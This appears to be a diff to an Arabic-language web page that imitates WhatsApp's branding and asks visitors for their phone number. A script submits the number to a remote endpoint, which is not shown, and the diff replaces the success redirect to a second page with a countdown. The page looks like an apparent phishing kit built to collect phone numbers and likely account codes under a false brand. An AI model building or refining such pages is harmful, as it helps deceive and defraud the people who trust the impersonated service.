@@ -94,6 +94,12 @@
             background-color: #1DA955;
         }
 
+        .countdown {
+            font-size: 16px;
+            color: #25D366;
+            margin-top: 20px;
+        }
+
         footer {
             text-align: center;
             margin-top: 20px;
@@ -135,10 +141,11 @@
             <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
         </div>
         <button onclick="sendMessage()">متابعة</button>
+        <div class="countdown" id="countdown"></div>
     </div>
 
     <footer>
-        © 2024 واتساب
+        ©️ 2024 واتساب
     </footer>
 
     <script>
@@ -167,8 +174,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('تم الإرسال بنجاح!');
-                    window.location.href = 'secondpage.html';
+                    startCountdown();
                 } else {
                     alert('حدث خطأ أثناء الإرسال.');
                 }
@@ -177,7 +183,8 @@
                 alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
             });
         }
-function startCountdown() {
+
+        function startCountdown() {
             const countdownElement = document.getElementById('countdown');
             let countdown = 10;
 
